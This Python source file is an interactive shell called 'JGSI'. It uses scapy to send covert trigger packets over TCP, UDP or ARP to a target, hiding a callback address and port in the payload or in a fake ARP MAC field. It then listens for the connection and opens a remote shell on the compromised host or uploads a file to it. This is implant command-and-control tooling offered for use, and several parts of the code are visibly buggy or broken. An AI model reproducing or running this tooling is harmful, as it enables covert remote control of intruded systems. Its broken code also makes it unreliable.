#!/usr/bin/python3
import socket
import struct
import netaddr
import sys
import select
import netifaces
import cmd
import pickle
import os
import ipaddress
import readline

from scapy.all import *


OKBLUE       = '\033[94m'
RED          = '\033[31m'
RED_BLINK    = '\033[31;5m'
RED_BOLD     = '\033[31;1m'
RESET        = '\033[0m'
YELLOW       = '\033[33m'
YELLOW_BLINK = '\033[33;5m'
OVERWRITE    = '\033[1000D'


class Trigger(object):
    def __init__(self):
        self.name = "DEFAULT" 
        self.source = "127.0.0.1"
        self.targetAddr = "127.0.0.1"
        self.targetPort = 80
        self.sPort = 80
        self.triggerType = "TCP"
        self.cPort = 80
        self.callbackAddr = "127.0.0.1"

class JGSIshell(cmd.Cmd):

    prompt = "JGSI ->"
    ruler = '~'
    local_addresses = []
    triggers = []
    trigger = Trigger()

    # Acquire local address (hopefully not picking the loopback address)
    try:
        for interface in netifaces.interfaces():
            local_addresses.append(netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr'])
    except KeyError as err:
            print("Interface %s",interface," does not have an IP address")

    local_ip = local_addresses[-1]


    def do_build(self,arg):
        'build : builds trigger based on current configuration'
        if len(self.triggers) == 0:
            self.triggers.append(self.trigger)
        else:
            for tgr in self.triggers:
                if str(tgr.name) == str(self.trigger.name):
                    Display().alert('trigger name already in use[Build FAILED!]')
                else:
                   self.triggers.append(self.trigger)
            

    def do_list_triggers(self,arg):
        'list_triggers : shows built triggers'
        if len(self.triggers) == 0:
            Display().info("No triggers configured")

        for tgr in self.triggers:
            msg0 = "======TRIGGER " + str(tgr.name) + " DETAILS===="
            print(msg0)
            msg00 = "SOURCE: " + str(tgr.source)
            Display().info(msg00)
            msg = "TARGET : " + str(tgr.targetAddr)
            Display().info(msg)
            msg1 = "TARGET PORT: " + str(tgr.targetPort)
            Display().info(msg1)
            msg2 = "Source PORT: " + str(tgr.sPort)
            Display().info(msg2)
            msg3 = "TYPE : " + str(tgr.triggerType)
            Display().info(msg3)
            msg4 = "CALLBACK PORT: " + str(tgr.cPort)
            Display().info(msg4)
            msg5 = "CALLBACK ADDR: " + str(tgr.callbackAddr)
            Display().info(msg5)
        
    def do_send(self,arg):
        'send <name> : sends trigger of <name>'
        found = False
        for tgr in self.triggers:
            if tgr.name == arg:
                found = True
                self.buildPacket(tgr)
            else:
                pass

        if found == False:
            msg = str(arg) + "does NOT exist!"
            Display().alert(msg)
        
    def do_set(self,arg):
        'set <option> <value> : sets trigger field values'
        args = arg.split(" ")
        
        if str.lower(args[0]) == "targetport":
            if self.validPort(args[1]):
                self.trigger.targetPort = int(args[1])
            else:
                Display().alert("Invalid Target port")

        elif str.lower(args[0]) == "target":
            try:
                temp = netaddr.IPAddress(args[1])
                if (validIP(temp)):
                        self.trigger.targetAddr = args[1]
            except ValueError:
                print("Invalid IP address set, leaving Target address as default")
                self.trigger.targetAddr = netaddr.IPAddress("127.0.0.1")
        elif str.lower(args[0]) == "source":
            try:
                temp = netaddr.IPAddress(args[1])
                if (validIP(temp)):
                        self.trigger.targetAddr = args[1]
            except ValueError:
                print("Invalid IP address set, leaving source address as default")
                self.trigger.source = netaddr.IPAddress("127.0.0.1")
        elif str.lower(args[0]) == "sourceport":
            if self.validPort(args[1]):
                self.trigger.sPort = int(args[1])
            else:
                Display.alert("Invalid Source Port")
                
        elif str.lower(args[0]) == "callbackport":
            if self.validPort(args[1]):
                self.trigger.cPort = int(args[1])
            else:
                Display().alert("Invalid CallBack Port")

        elif str.lower(args[0]) == "callback":
            try:
                temp = netaddr.IPAddress(args[1])
                if (validIP(temp)):
                    self.trigger.callbackAddr = args[1]
            except ValueError:
                print("Invalid IP address set, leaving callback address as default")
                self.trigger.callbackAddr = netaddr.IPAddress("127.0.0.1")
        
        elif str.lower(args[0]) == "triggertype":
            if self.validateType(str.upper(args[1])):
                self.trigger.triggerType = str.upper(args[1])
            else:
                Display().alert("Valid types are [ARP || UDP || TCP]")
        
        elif str.lower(args[0]) == "name":
            if len(self.triggers) != 0:
                for tgr in self.triggers:
                    if str(tgr.name) == str(args[1]):
                        Display().alert("trigger name already in use")
                else:
                    self.trigger.name = args[1]

        else:
            Display().alert("Invalid option")

    def do_show(self,arg):
        'show options : show details of current trigger'
        if str.lower(arg) == "options":
            msg0 = "======TRIGGER " + str(self.trigger.name) + " DETAILS===="
            print(msg0)
            msg00 = "SOURCE: " + str(self.trigger.source)
            Display().info(msg00)
            msg = "TARGET : " + str(self.trigger.targetAddr)
            Display().info(msg)
            msg1 = "TARGET PORT: " + str(self.trigger.targetPort)
            Display().info(msg1)
            msg2 = "Source PORT: " + str(self.trigger.sPort)
            Display().info(msg2)
            msg3 = "TYPE : " + str(self.trigger.triggerType)
            Display().info(msg3)
            msg4 = "CALLBACK PORT: " + str(self.trigger.cPort)
            Display().info(msg4)
            msg5 = "CALLBACK ADDR: " + str(self.trigger.callbackAddr)
            Display().info(msg5)
    
            
    def do_exit(self,arg):
        'Exit JGSI'
        print("JGSI -> FIMO")
        exit(1)

    def do_save(self,arg):
        'save : saves all built triggers in triggers/ for import in a later session'


    def validIP(ipaddr):
        if not netaddr.valid_ipv4(ipaddr):
            msg = "Not a valid IP address (%s)" % ipaddr
            Display.alert(msg)
        return ipaddr

    def validPort(self,port):
        validPort = False

        if int(port) < 0 :
            print("Ports can not be negative")
        elif int(port) > 0:
            if int(port) < 1024:
                msg = "[INFO] Port " + str(port) + " requires root permissions"
                Display().alert(msg)
                validPort = True
            elif int(port) <= 65535:
                validPort = True
            else:
                print("Ports do not exist above 65535")
        else:
            print("Error validating port ",port)

        return validPort

    def validateType(self,tType):
        validType = False
        if (tType == "ARP"):
            validType = True
        elif (tType == "UDP"):
            validType = True
        elif (tType == "TCP"):
            validType = True
        else:
            validType = False

        return validType

    def open_file(in_file):
        try:
            f = open(in_file)
        except IOError as err:
            print(in_file)
            print(err.strerror)
            sys.exit(2)
        return f

    def validateInput(self,tPort,tType,sPort,cPort):
        validatedInput = True
        validInputs = {"tPort" : False, "tType" : False, "sPort" : False
                , "cPort" : False}

        validInputs.update(tPort=self.validPort(tPort))
        validInputs.update(tType=self.validateType(tType))
        validInputs.update(sPort=self.validPort(sPort))
        validInputs.update(cPort=self.validPort(cPort))

        for key,val in validInputs.items():
            if val == True:
                pass
            else:
                print(key," is invalid")
                return False

        return validatedInput

    def trigger_prompt(self,packet,trigger):
        'Displays the created trigger that will be sent to the target for verification of details prior to firing.  Receives packet(p) and the full args object.'
    

        if str.lower(trigger.triggerType) == 'tcp' or str.lower(trigger.triggerType == 'udp'):
            print("\nPreparing to send a trigger packet with the folowing details...\n")
            print("========IP Header======")
            print("Source: %s" % packet.src)
            print("Dest  : %s" % packet.dst)
            print("=======%s Header======" % trigger.triggerType.upper())
            print("SPort : %s" % packet.sport)
            print("DPort : %s" % packet.dport)
            print("=====Callback Data=====")
            print("IP    : %s" % trigger.callbackAddr)
            print("Port  : %s" % trigger.cPort)
            '''if args.upload:
                print "======File Upload======"
                print args.upload.name
            else:
                print "====Shell Callback====="'''
            print("==========================")
        
            resp = input("\nReady to send it? ").lower()
            if resp == "yes" or resp == "y":
                sendIT = True
            elif resp == "no" or resp == "n":
                print("Not gonna send it...")
                sendIT = False
            
            return sendIT

        else:
            print("\nPreparing to send a trigger packet with the folowing details...\n")
            print("========ARP Header========")
            print("HwDst  : %s" % packet.hwdst)
            print("HwSrc  : %s" % ":".join(packet.hwsrc))
            print("======Callback Data=======")
            print("IP    : %s" % trigger.callback)
            print("Port  : %s" % trigger.cPort)

            '''if args.upload:
                print("=======File Upload========")
            else:
                print("======Shell Callback=======")'''
            
            print("==========================")
        
            resp = input("\nReady to send it? ").lower()
            if resp == "yes" or resp == "y":
                sendIT = True
            elif resp == "no" or resp == "n":
                print("Not gonna send it...")
                sendIT = False
            
            return sendIT

    def handle_shell(callback, c_info):
        sys.stdout.write("%s%s>%s" % (RED_BOLD,c_info[0],RESET))
        sys.stdout.flush()
        while True:

            # ulitizes select to determine which stream has data to be received from
            sock_list = [sys.stdin,callback]
            read_sockets, write_socket, error_socket = select(sock_list,[],[])

            for sock in read_sockets:
                if sock == callback:
                    data = b""
                    buffer = 1024
                    while True:
                        message = sock.recv(buffer)
                        data += message
                        if message[-1] == "\n":
                            break
                    sys.stdout.write("\n" + data + "%s%s>%s" % (RED_BOLD,c_info[0],RESET))
                    sys.stdout.flush()
                else:
                    message = sys.stdin.readline().strip()
                    if message.strip() == "exit":
                        break
                    else:
                        callback.send(message + '\n')
                        sys.stdout.write("%s%s>%s" % (RED_BOLD,c_info[0],RESET))
                        sys.stdout.flush()

            if message == "exit":
                callback.send(message + '\n')
                callback.shutdown(socket.SHUT_RDWR)
                callback.close()
                break

    def handle_upload(sock, fd):
   
        chunk = fd.read(1024)
        total = 0
        while(chunk):
            sock.send(chunk)
            total += len(chunk)
            print("Sent %d bytes" % total)
            chunk = fd.read(1024)
        fd.close()
        sock.close()


    def buildPacket(self,trigger):

        sendIt = False

        if str.lower(trigger.triggerType) == "tcp":

            ip_layer = IP(dst=trigger.targetAddr,src=trigger.source)
            tcp_layer = TCP(dport=trigger.targetPort,sport=trigger.sPort)
            callback = Raw(load=struct.pack("!H",trigger.cPort))/Raw(load=netaddr.IPAddress(trigger.callbackAddr).packed)
            packet = ip_layer/tcp_layer/callback
        
            sendIt = self.trigger_prompt(packet,trigger)

        elif str.lower(trigger.triggerType) == "udp":

            ip_layer = IP(dst=trigger.targetAddr,src=trigger.source)
            udp_layer = UDP(dport=trigger.targetPort,sport=trigger.sPort)
            callback = Raw(load=struct.pack("!H",trigger.cPort))/Raw(load=trigger.callbackAddr.packed)
            trigger = ip_layer/udp_layer/callback

            sendIt = self.trigger_prompt(trigger,args)

        elif str.lower(trigger.triggerType) == "arp":

            # build hwsrc field to hide the callback address and port as a pseudo mac address
            callback = []
            callback.append(format(trigger.cPort,'x')[0:2])
            callback.append(format(trigger.cPort,'x')[2:])
 
            for octet in netaddr.IPAddress(trigger.targetAddr).words:
                callback.append(format(octet,'x'))
 
            packet = ARP(pdst = trigger.targetAddr, hwdst = "ff:fe:ff:ff:fe:ff", hwsrc = callback)

            sendIt = self.trigger_prompt(packet,args)

        if trigger.callbackAddr in self.local_addresses or "0.0.0.0":

            #print "[%s*%s] Preparing listener." 
            Display().info("Preparing listener.")

            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(30)
            try:
                s.bind((trigger.callbackAddr,trigger.cPort))
                s.listen(1)
            except:
                #print "[!] Failed to bind listener" % (YELLOW_BINK,RESET)
                Display().alert("Failed to bind listener")
                #sys.exit(1)

            #print "[*] Ready to receive callback. Sending trigger!" % (RED_BLINK,RESET)
            Display().info("Ready to receive callback. Sending trigger!")
            if sendIt == True:
                send(packet)
            else:
                Display().alert("Trigger not prepared[SEND FAILED]")
        
            #print "[*] Waiting for callback....." % (RED_BLINK,RESET)
            Display().info("Waiting for callback....")
            try:
                trigger.callbackAddr, c_info = s.accept()
                #print "[%s!%s] Received connection from %s" % (YELLOW_BLINK,c_info[0],RESET)
                Display().alert("Received connection from %s" % c_info[0])
            except socket.timeout:
                #print "[%s!%s] No response, exiting..." % (YELLOW_BLINK,RESET)
                Display().alert("No response, exiting...")
                sys.exit(1)

            if not args.upload:
                handle_shell(trigger.callbackAddr, c_info)
            else:
                Display().info("Uploading file..")
                handle_upload(callback, args.upload)
                Display().info("File upload complete.")

        else:

            #print "\n[!] Callback address does not appear to be on this box.\n Ensure a " +\
                #"listener is ready.\n"
            Display().alert("Callback address not on this box. Ensure a listener is ready.")
            raw_input("Press [ENTER] to continue....")
            if sendIt == True:
                send(trigger)
            else:
                Display().alert("Trigger not prepared[SEND FAILED]")


class Display(object):

    def alert(self,message):
        print("[%s!%s] %s" % (YELLOW_BLINK,RESET,message))

    def info(self,message):
        print("[%s*%s] %s" % (RED,RESET,message))


 
if __name__ == "__main__":
   JGSIshell().cmdloop() 

